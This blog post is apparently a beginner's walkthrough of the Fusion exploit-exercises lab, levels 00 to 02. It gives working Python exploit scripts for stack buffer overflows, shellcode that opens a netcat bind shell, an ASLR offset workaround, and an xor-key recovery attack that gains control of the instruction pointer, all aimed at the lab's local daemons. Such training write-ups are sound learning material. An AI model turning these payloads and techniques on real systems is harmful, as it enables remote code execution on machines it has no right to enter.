---

layout: post
title:  "Fusion Exploit Exercises: Part one"
author: jonatanhal

---

# Intro

Welcome back everyone. I'm excited to get to write about some new
stuff, these past protostar-challenges have been tricky & I've
certainly learned a lot about binary exploitation from them.

If you yourself is interested in picking up exploitation, I would
certainly recommend you to have a look at said challenges.

Experiencing first hand how bad code can be taken advantage of to
execute evil code, it sure as hell seems appropriate that technologies
that mitigate these bugs exist.

**Disclaimer**: I'm a noob.

## [level00](https://exploit-exercises.com/fusion/level00/)

>This is a simple introduction to get you warmed up. The return
>address is supplied in case your memory needs a jog :)
>
>Hint: Storing your shellcode inside of the fix_path ‘resolved’ buffer
>might be a bad idea due to character restrictions due to
>realpath(). Instead, there is plenty of room after the HTTP/1.1 that
>you can use that will be ideal (and much larger).

Listening on port 20000 is `/opt/fusion/bin/level00`, a executable inwhich
we will try to find a stack-based bufferoverflow.

~~~
$ python -c "print 'GET foo HTTP/1.1'" | nc 127.0.0.1 20000
trying to access foo
~~~

Nothing special here, move along citizen.

### Crashing the process - 'A'*(>136)

{% highlight c %}

int fix_path(char *path)
{
  char resolved[128];
  
  if(realpath(path, resolved) == NULL) return 1; // can't access path. will error trying to open
  strcpy(path, resolved);
}

{% endhighlight %}

Here's a path, oh it's longer than 128 bytes. **STRCPY NOOOOOO...**

![Crash]({{ site-url }}/assets/post_images/fusion_level00_Acrash.gif)

### Crashing the process - realpath link-resolution

`realpath` will resolve links, `../../` paths and other miscellaneous ways
of referring to a path into a absolute path.

If we create a file with a very very long filename and create a link
to that file, realpath will resolve the link. The program will then
copy the path into `resolved`, and overflow it.

~~~
$ touch `python "print 'A'*192"`
$ ln -s AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ./l00l
$ python -c "print 'GET /home/fusion/l00l HTTP/1.1'" | nc 127.0.0.1 20000
~~~

A real pain in the neck when experimenting with exploiting the process,
but a neat lil' trick.

Any of the methods above will produce a logging entry that can be seen when
running `dmesg`.

~~~
$ python -c "print 'GET ' + 'A'*137 + ' HTTP/1.1'" | nc 127.0.0.1 20000
[debug] buffer is at 0xbffff8f8 :-)
$ dmesg | tail -n 1
[12027.104103] level00[3176]: segfault at bf004135 ip 08049975 sp bffff8e0 error 4 in level00[8048000+3000]
~~~

#### Control over program counter

~~~
$ python -c "print 'GET '+'A'*139+'\xef\xbe\xad\xde'+' HTTP/1.1'" | nc 127.0.0.1 20000
[debug] buffer is at 0xbffff8f8 :-)
$ dmesg | tail -n 1
[12416.936119] level00[3221]: segfault at deadbeef ip deadbeef sp bffff8e0 error 15
~~~

Let's whip up some python to get this show on the road.

We're gonna need some shellcode, I found the one I used below
[here](https://www.exploit-db.com/exploits/37359/).

{% highlight python %}
# File: fusion00_solution.py
from struct import pack

NOPSLED="\x90"*12
SHELLCODE="\x31\xc0\x50\x68\x6e\x2f\x6e\x63\x68\x2f\x2f\x62\x69\x89\xe3\x50\x68\x35\x35\x35"+\
    "\x35\x68\x2d\x6c\x74\x70\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68"+\
    "\x2d\x65\x2f\x2f\x89\xe2\x50\x52\x51\x53\x89\xe7\xb0\x0b\x89\xf9\x31\xd2\xcd\x80"
OVERFLOW="A"*139
ADDR=pack('L', 0xbffff8f8+len(OVERFLOW)+20)
PAYLOAD="GET "+OVERFLOW+ADDR+" HTTP/1.1" + NOPSLED+SHELLCODE

print PAYLOAD
{% endhighlight %}

The shellcode listed above will open up netcat which will begin listening on port 5555
and accept commands from us.

~~~
$ # On fusion guest:
$ python fusion00_solution.py | nc 127.0.0.1 20000
< On another terminal >
$ nc 127.0.0.1 5555
id
uid=20000	gid=20000	groups=20000
~~~

![Crash]({{ site-url }}/assets/post_images/fusion_level00_success.jpg)

* * * 

## [level01](https://exploit-exercises.com/fusion/level01/)

>level00 with stack/heap/mmap aslr, without info leak :)

Neat! Same vulnerability as in the previous level, which is good
because we can reuse our previous solution as a way to get some
hands-on experience on attacking ASLR.

~~~
$ python level00_solution.py | nc 127.0.0.1 20001
$ dmesg | tail -n 1
[74573.771758] level01[8217]: segfault at bffff997 ip bffff997 sp bfb22800 error 14
~~~

Note that the stackpointer at the point of crashing is set to
0xbfb22800, and this address does not seem to change across different
tries. Cool, I wonder why that is.

A .txt describing PaX's ASLR-implementation (found
[here](http://pax.grsecurity.net/docs/aslr.txt)) 

>In practice brute forcing can be applied to bugs that are
>in network daemons that fork() on each connection since fork() preserves
>the randomized layout, as opposed to execve() which replaces it with a new
>one.

It turns out that `serve_forever` uses fork. Which would explain 
the non-changing, but still randomized stack-address.

Creating a crash on the previous level would allow us to observe
the offsets between the buffer and the stack-pointer at the point
of crash.

And the offsets should be the same, I mean - It's not called offset
layout randomization.

Note however that we would need to adjust the address after any reboot
or when level01 executable restarts.

~~~
prevAddr=0xbffff8f8
prevSP=0xbffff8e0
offset=prevAddr-prevSP

randSP=0xbfb22800
randAddr=randSP+offset
~~~

{% highlight python %}
# File: level01_solution.py
from struct import pack

NOPSLED="\x90"*12
SHELLCODE="\x31\xc0\x50\x68\x6e\x2f\x6e\x63\x68\x2f\x2f\x62\x69\x89\xe3\x50\x68\x35\x35\x35"+\
    "\x35\x68\x2d\x6c\x74\x70\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68"+\
    "\x2d\x65\x2f\x2f\x89\xe2\x50\x52\x51\x53\x89\xe7\xb0\x0b\x89\xf9\x31\xd2\xcd\x80"
OVERFLOW="A"*139
ADDR=pack('L', 0xbfb22818+len(OVERFLOW)+20)
PAYLOAD="GET "+OVERFLOW+ADDR+" HTTP/1.1" + NOPSLED+SHELLCODE

print PAYLOAD
{% endhighlight %}

### Testing our solution.

~~~
$ python level01_solution.py | nc 127.0.0.1 20001
< on another terminal >
$ nc 127.0.0.1 5555
id
uid=20000	gid=20000	groups=20000
~~~

![Success]({{ site-url }}/assets/post_images/fusion_level01_success.jpg)

* * * 

## [level02](https://exploit-exercises.com/fusion/level02/)

>This level deals with some basic obfuscation / math stuff.
>
>This level introduces non-executable memory and return into libc /
>.text / return orientated programming (ROP).

The buffer we send will be encrypted, and it will be encrypted via a
single xor operation, with a key thats generated when connecting to
the serving application.

We can abuse the fact that the encryption is a single xor, if we send
a already encrypted back to the application; the buffer will be
decrypted (since `message xor key = cipher`, and `cipher xor key =
message`.)

First things first, let's break some stuff.

### Crashing the application

{% highlight python %}
from struct import pack

LEN=0x20000+0xf

PAYLOAD='E'+pack('I', LEN)+'\xcc'*LEN+'Q'

print PAYLOAD
{% endhighlight %}

**Note: We have to send 'Q' to the application, or else it will exit
without returning using the saved return-address**

We can get the key the program uses by sending 128 nullbytes & saving
the returned key, (key xor 0 = key.)

Once we have the key, if we have a equivalent encryption-algorithm on
our side, we can produce and send data that will be decrypted as a
payload. 

### Control over EIP!

{% highlight python %}
# -*- coding: utf-8 -*-
import socket, time
from struct import pack, unpack

OVERFLOW=0x14
OLEN=0x20000+OVERFLOW
LEN=128
ADDR=pack('I',0xdeadbeef)
PAYLOAD='E'+pack('I', LEN)+"\x00"*LEN
KEYBUF=[]

def cipher(message, length):
    global KEYBUF
    cipherd = []
    for i in xrange(0, length, 4):
        cipherd.append(unpack('I', message[i:i+4])[0]^KEYBUF[(i/4)%32])
    return cipherd

def main():
    global OLEN, LEN, PAYLOAD, ADDR, KEYBUF
    s = socket.create_connection(("127.0.0.1", 20002))
    s.sendall(PAYLOAD)

    # flush some garbage down the toiler (177 ascii + 4 size)
    s.recv(181, socket.MSG_WAITALL)

    key=s.recv(128, socket.MSG_WAITALL)
    KEYBUF=[unpack('I',key[i:i+4])[0] for i in range(0, 128, 4)]

    # Create a ciphered block of payload
    ENCRYPTED_PAYLOAD='E'+pack('I', OLEN)
    part=''.join(pack('I', x) for x in cipher(ADDR*32, len(ADDR*32)))
    ENCRYPTED_PAYLOAD+=part*1024+part[:OVERFLOW]

    s.sendall(ENCRYPTED_PAYLOAD+"Q")
    s.close()

if __name__ == "__main__":
    main()
{% endhighlight %}

~~~
$ dmesg | tail -n 1
... level02[23974]: segfault at deadbeef ip deadbeef sp bfc5fde0 error 15
~~~

That was reasonable enough, but I'm now rapidly approaching unknown
territory (return oriented programming.) Well, thankfully the fusion-VM
comes preinstalled with ROPgadget, which undoubtedly will help me
in finding the rop-gadgets I'm looking for.

But what *am* I looking for exactly?

Word on the street is that one way to achieve code-execution, is to
create a fake stack-frame, which can be used when calling a function.

### Party in the stack, business in frame

There's really not a lot of gadgets available in the executable, 13
gadgets in total. None of which is very helpful in and of their own;
but we hopefully get some use out of them.

We need to overwrite a couple of things in memory, and we can try see
what happends when we return into a function like fprintf.

Provided that the end of our buffer looks like this (`JUNK = 0xdeadbabe`):

`&(fprintf@plt), JUNK, JUNK, JUNK, 'AAAA', 'BBBB', 'CCCC'`

We can attach to the process, set a breakpoint at `_IO_vfprintf_internal`, and
see what happends.

~~~
[Switching to process 2475]
_IO_vfprintf_internal (s=0x41414141, format=0x42424242 <Address 0x42424242 out of bounds>,
    ap=0x43434343 <Address 0x43434343 out of bounds>) at vfprintf.c:1288
1288	vfprintf.c: No such file or directory.
		in vfprintf.c
(gdb) c
Continuing.

Program recieved signal SIGSEGV, Segmentation fault.
_IO_vfprintf_internal (s=0x41414141, format=0x42424242 <Address 0x42424242 out of bounds>,
    ap=0x43434343 <Address 0x43434343 out of bounds>) at vfprintf.c:1288
1288	vfprintf.c
=> 0xb7623160 <_IO_vfprintf_internal+48>: 80 7e 46 00	cmp	BYTE PTR [esi+0x46], 0x0
(gdb) i r esi
esi		0xdeadbabe		-559039810
~~~

**gdb-cheats:**

* `set follow-fork-mode child`

:QUESTIONS:

* **Q:** Is it possible to retrieve a saved esp from nread, will nread
  keep reading items of the stack?
  
  **A:** ??

* **Q:** Is my exploit failing because of wrong aligmnent or wrong IV?

  **A:** If your exploit is crashing the process, try to check where
  sigsegv happened. If it happends at a random location, you probably have the wrong IV.
  
  On the other hand, if the crash occurs in the same location, that would
  indicate that your payload is not well aligned. Add some padding :)

* **Q:** When rop-chaining, will the chain progress towards lower
  memory-addresses or higher memory-addresses?

  **A:** When popping things of the stack, the stack-pointer will increment.

When creating the fake stack, modifying the stack-pointer
will break the chain, right?

:END_QUESTIONS:
